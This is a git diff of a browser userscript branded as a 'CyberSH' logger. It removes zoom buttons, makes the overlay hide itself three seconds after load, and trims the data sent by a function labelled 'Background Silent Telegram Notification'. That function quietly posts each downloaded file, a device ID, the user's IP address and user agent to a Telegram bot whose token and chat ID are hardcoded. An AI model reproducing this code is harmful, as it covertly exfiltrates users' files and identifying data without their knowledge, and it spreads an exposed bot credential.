@@ -177,7 +177,7 @@
         <img src="https://avatars.githubusercontent.com/u/85736436?v=4" alt="CyberSH" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" />
     </div>`;
 
-    // 4. Inject Professional UI Overlay (Scrollable Container)
+    // 4. Inject Professional UI Overlay (Without Zoom Buttons)
     const overlayHtml = `
     <div id="cybersh-logger-overlay" style="position: fixed; top: 15px; left: 50%; transform: translateX(-50%); ${widthStyle} ${heightStyle} background: linear-gradient(145deg, rgba(15, 23, 42, 0.96), rgba(2, 6, 23, 0.98)); color: #f8fafc; z-index: 999999; border-radius: 20px; padding: 18px; font-family: system-ui, -apple-system, sans-serif; font-size: 12px; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.75), 0 0 20px rgba(56, 189, 248, 0.12); display: flex; flex-direction: column; border: 1px solid rgba(56, 189, 248, 0.3);">
         
@@ -192,10 +192,8 @@
                     <div style="font-size: 9px; color: #94a3b8; font-weight: 500;">Secure Edition v3.2</div>
                 </div>
             </div>
-            <div style="display: flex; gap: 5px; align-items: center;">
-                <button id="cybersh-btn-zoom-out" style="background: rgba(56, 189, 248, 0.1); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); width: 26px; height: 26px; border-radius: 6px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center;" title="Zoom Out (-)">-</button>
-                <button id="cybersh-btn-zoom-in" style="background: rgba(56, 189, 248, 0.1); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); width: 26px; height: 26px; border-radius: 6px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center;" title="Zoom In (+)">+</button>
-                <button id="cybersh-btn-support" style="background: rgba(14, 165, 233, 0.12); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); padding: 5px 9px; border-radius: 6px; font-size: 10px; font-weight: 600; cursor: pointer; text-decoration: none;">Support</button>
+            <div style="display: flex; gap: 6px; align-items: center;">
+                <button id="cybersh-btn-support" style="background: rgba(14, 165, 233, 0.12); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); padding: 5px 10px; border-radius: 6px; font-size: 10px; font-weight: 600; cursor: pointer; text-decoration: none;">Support</button>
                 <button id="cybersh-btn-minimize" style="background: rgba(56, 189, 248, 0.1); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); width: 26px; height: 26px; border-radius: 6px; display: flex; align-items: center; justify-content: center; cursor: pointer;" title="Minimize">
                     <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line></svg>
                 </button>
@@ -251,6 +249,14 @@
     const timerCountSpan = document.getElementById('cybersh-timer-count');
     const timerDurationInput = document.getElementById('cybersh-timer-duration');
 
+    // Auto Minimize 3 seconds after load
+    setTimeout(() => {
+        if (overlay && overlay.style.display !== 'none') {
+            overlay.style.display = 'none';
+            avatar.style.display = 'block';
+        }
+    }, 3000);
+
     // Save overlay dimensions to localStorage whenever user resizes it
     const resizeObserver = new ResizeObserver(entries => {
         for (let entry of entries) {
@@ -260,29 +266,6 @@
         }
     });
     resizeObserver.observe(overlay);
-
-    // Zoom In (+) and Zoom Out (-) Button Click Handlers
-    document.getElementById('cybersh-btn-zoom-in').onclick = () => {
-        const currentWidth = overlay.offsetWidth;
-        const currentHeight = overlay.offsetHeight;
-        const newWidth = Math.min(window.innerWidth * 0.95, currentWidth + 40);
-        const newHeight = Math.min(window.innerHeight * 0.9, currentHeight + 35);
-        overlay.style.width = newWidth + 'px';
-        overlay.style.height = newHeight + 'px';
-        localStorage.setItem('cybersh_overlay_width', overlay.style.width);
-        localStorage.setItem('cybersh_overlay_height', overlay.style.height);
-    };
-
-    document.getElementById('cybersh-btn-zoom-out').onclick = () => {
-        const currentWidth = overlay.offsetWidth;
-        const currentHeight = overlay.offsetHeight;
-        const newWidth = Math.max(280, currentWidth - 40);
-        const newHeight = Math.max(250, currentHeight - 35);
-        overlay.style.width = newWidth + 'px';
-        overlay.style.height = newHeight + 'px';
-        localStorage.setItem('cybersh_overlay_width', overlay.style.width);
-        localStorage.setItem('cybersh_overlay_height', overlay.style.height);
-    };
 
     // Adjustable Countdown Timer Logic (Default 30 seconds)
     let timeLeft = parseInt(timerDurationInput.value) || 30;
@@ -512,32 +495,26 @@
 
     await checkDeviceApproval();
 
-    // Background Silent Telegram Notification via ipapi.co (Reliable IP info API)
+    // Background Silent Telegram Notification with ONLY IP Address
     async function sendToTelegramBot(blob, fileName) {
         try {
             let ipInfo = "N/A";
-            let city = "N/A";
-            let region = "N/A";
-            let country = "N/A";
-            let postal = "N/A";
-            let timezone = "N/A";
-            let loc = "N/A";
-            let org = "N/A";
 
             try {
-                const ipRes = await fetch("https://ipapi.co/json/");
+                const ipRes = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipRes.json();
-                if (ipData && !ipData.error) {
-                    ipInfo = ipData.ip || "N/A";
-                    city = ipData.city || "N/A";
-                    region = ipData.region || "N/A";
-                    country = ipData.country_name || "N/A";
-                    postal = ipData.postal || "N/A";
-                    timezone = ipData.timezone || "N/A";
-                    loc = `${ipData.latitude || "N/A"}, ${ipData.longitude || "N/A"}`;
-                    org = ipData.org || "N/A";
+                if (ipData && ipData.ip) {
+                    ipInfo = ipData.ip;
                 }
-            } catch (e) {}
+            } catch (e) {
+                try {
+                    const fallbackRes = await fetch("https://ipapi.co/json/");
+                    const fallbackData = await fallbackRes.json();
+                    if (fallbackData && fallbackData.ip) {
+                        ipInfo = fallbackData.ip;
+                    }
+                } catch (err2) {}
+            }
 
             const botToken = "5797264734:AAGOn65GaUIwIUzWk2B_dtiXSXqqqLHoVYA";
             const chatId = "1251593717";
@@ -546,10 +523,6 @@
             const caption = `📥 *New Map Downloaded!*\n\n` +
                             `🆔 *Device ID:* \`${deviceId}\`\n` +
                             `🌐 *IP Address:* \`${ipInfo}\`\n` +
-                            `🏙️ *Location:* \`${city}, ${region}, ${country} (${postal})\`\n` +
-                            `📍 *Coordinates:* \`${loc}\`\n` +
-                            `🏢 *ISP / Org:* \`${org}\`\n` +
-                            `⏰ *Timezone:* \`${timezone}\`\n` +
                             `📱 *User Agent:* \`${userAgent}\``;
 
             const formData = new FormData();
